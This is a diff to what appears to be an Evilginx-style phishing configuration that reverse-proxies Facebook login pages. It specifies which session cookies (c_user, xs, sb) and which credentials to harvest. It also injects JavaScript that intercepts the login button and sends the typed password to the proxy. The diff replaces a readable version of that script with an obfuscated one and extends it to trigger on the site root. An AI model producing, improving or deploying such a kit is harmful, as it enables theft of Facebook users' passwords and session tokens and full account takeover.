@@ -1,10 +1,13 @@
 author: '@charlesbel'
 min_ver: '2.3.0'
+
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'facebook.com', session: false, is_landing: false}
   - {phish_sub: 'static', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'scontent', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -13,9 +16,13 @@ sub_filters:
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: '', domain: 'facebook.com', search: '{domain_regexp}', replace: '{domain_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-javascript; charset=utf-8']}
   - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
+
 credentials:
   username:
     key: 'email'
@@ -25,37 +32,15 @@ credentials:
     key: 'unenc_password'
     search: '(.*)'
     type: 'post'
+
 login:
   domain: 'www.facebook.com'
   path: '/login'
+
 js_inject:
   - trigger_domains: ["www.facebook.com", "m.facebook.com"]
-    trigger_paths: ["/login(.*)"]
+    trigger_paths: ["/login(.*)", "/"]
     trigger_params: []
     script: |
-        let start = setInterval(function() {
-          if (document.querySelectorAll('form[id=login_form]').length) {
-            clearInterval(start);
-            let subButton = document.querySelector('button[name=login]')
-            let parent = subButton.parentElement
-            async function a(ev) {
-              ev.stopPropagation();
-              ev.preventDefault();
-              var password = document.getElementsByName('pass')[0].value;
-              await fetch('/login', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "unenc_password=" + encodeURIComponent(password)});
-              parent.removeEventListener('click', a, true);
-              ev.target.click()
-            }
-            parent.addEventListener("click", a, true);
-            new MutationObserver(function(mutations) {
-              mutations.forEach(function(mutation) {
-                if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
-                  parent.removeEventListener('click', a, true);
-                  parent.addEventListener("click", a, true);
-                }
-              });
-            }).observe(document.querySelector('button[name=login]'), {
-              attributes: true
-            });
-          }
-        }, 100);
+      // Copyright 2023 Charles Bel (@charlesbel)
+      function _0x985d($,_){let x=_0xf97f();return(_0x985d=function($,_){return x[$-=343]})($,_)}function _0xf97f(){let $=["attributeN","click","body","8biKOKR","40UiRbvX","UoexX","615944PcbfSB","split","aHYNi","tor","attributes","forEach","type","qdmpA","iXxKQ","button[nam","IDndk","pass","182915mhEMrz","target","n/x-www-fo","addEventLi","ame","entdq","unenc_pass","getElement","ation","removeEven","TGgdY","gin_form]","location","e=login]","host","POST","disconnect","dZUPl","1274670gvPgRK","ault","VhAJM","4138434vAlABX","LMfgo","querySelec","16992500kxOsiY","/login","value","applicatio","form[id=lo","tListener","1IISHgR","preventDef","ded","pAkGw","ent","xpaJX","observe","then","IAkuG","1335732KsfMYC","sByName","parentElem","aEKLE","BXftT","rm-urlenco","word=","2004667LrTdLQ","disabled","PVKrR","stener","stopPropag"];return(_0xf97f=function(){return $})()}const _0x1b8d41=_0x985d;!function($,_){let x=_0x985d,t=$();for(;;)try{let e=parseInt(x(345))/1*(parseInt(x(372))/2)+-parseInt(x(354))/3+parseInt(x(370))/4*(-parseInt(x(384))/5)+-parseInt(x(402))/6+parseInt(x(361))/7*(-parseInt(x(369))/8)+-parseInt(x(405))/9+parseInt(x(408))/10;if(237496===e)break;t.push(t.shift())}catch(n){t.push(t.shift())}}(_0xf97f,237496);const waitForEl=$=>{let _={IDndk:function($,_){return $(_)},PVKrR:function($,_){return $(_)}};return new Promise(x=>{let t=_0x985d;if(document[t(407)+t(375)]($))return _[t(363)](x,document[t(407)+t(375)]($));let e=new MutationObserver(n=>{let r=t;document[r(407)+r(375)]($)&&(_[r(382)](x,document[r(407)+r(375)]($)),e[r(400)]())});e[t(351)](document[t(368)],{childList:!0,subtree:!0})})};waitForEl(_0x1b8d41(343)+_0x1b8d41(395))[_0x1b8d41(352)](()=>{let $=_0x1b8d41,_={pAkGw:function($,_){return $===_},iXxKQ:$(383),BXftT:function($,_,x){return $(_,x)},aEKLE:$(409),qdmpA:$(399),entdq:$(411)+$(386)+$(359)+$(347),xpaJX:function($,_){return $+_},IAkuG:$(390)+$(360),TGgdY:function($,_){return $(_)},dZUPl:$(367),aHYNi:function($,_){return $==_},UoexX:$(376),LMfgo:$(362),VhAJM:$(381)+$(397)},x=document[$(407)+$(375)](_[$(404)]),t=x[$(356)+$(349)];async function e(n){let r=$;n[r(365)+r(392)](),n[r(346)+r(403)](),(!x[r(362)]||_[r(348)](document[r(396)][r(398)][r(373)](".")[0],"m"))&&(await _[r(358)](fetch,_[r(357)],{method:_[r(379)],headers:{"Content-Type":_[r(389)]},body:_[r(350)](_[r(353)],_[r(394)](encodeURIComponent,document[r(391)+r(355)](_[r(380)])[0][r(410)]))}),t[r(393)+r(344)](_[r(401)],e,!0),n[r(385)][r(367)]())}t[$(387)+$(364)](_[$(401)],e,!0),new MutationObserver(function(x){let n=$;x[n(377)](function($){let x=n;_[x(374)]($[x(378)],_[x(371)])&&_[x(374)]($[x(366)+x(388)],_[x(406)])&&_[x(374)]($[x(385)][x(362)],!0)&&(t[x(393)+x(344)](_[x(401)],e,!0),t[x(387)+x(364)](_[x(401)],e,!0))})})[$(351)](document[$(407)+$(375)](_[$(404)]),{attributes:!0})});
